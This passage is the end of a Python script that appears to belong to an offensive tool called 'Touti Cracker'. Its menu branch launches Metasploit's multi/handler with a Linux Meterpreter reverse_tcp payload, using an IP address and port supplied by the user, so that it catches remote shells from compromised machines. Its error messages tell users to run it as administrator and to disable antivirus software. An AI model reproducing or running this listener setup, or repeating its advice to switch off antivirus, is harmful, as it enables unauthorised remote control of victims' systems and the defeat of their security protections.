                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        else:
                            print(error+"MacOS and Android are not supported yet but it will be in the next update. StayTuned: " + the_link)    
                    elif systemtype == "Darwin":
                        print("" + error + "MacOS is not supported yet but it will be in the next update and much more !. StayTuned: " + the_link)
                        
                else:
                    print(error+"Please enter a valid choice (1/2).")
            else:
                print(error+"Please enter a valid choice (1/2/3/4/5/6/99).")
    
except KeyboardInterrupt:
    print(error+"Program interrupted. Exiting...")
    clearsystem()
    neon_text("Good Bye", duration=3)
    print("Thank's for using Touti-Sudo's Software")
    exit()

except ValueError as e:
    print(error+f" {e}")
    exit()
except PermissionError :
    print(error+"Please run Touti Cracker at admin mod! and disable antivirus software")
    exit()
except FileNotFoundError :
    print(error+"The file was not found. Try reinstalling Touti Cracker !")
    exit()
except OSError : 
    print(error + "Please check your system compatibility and stability")
    exit()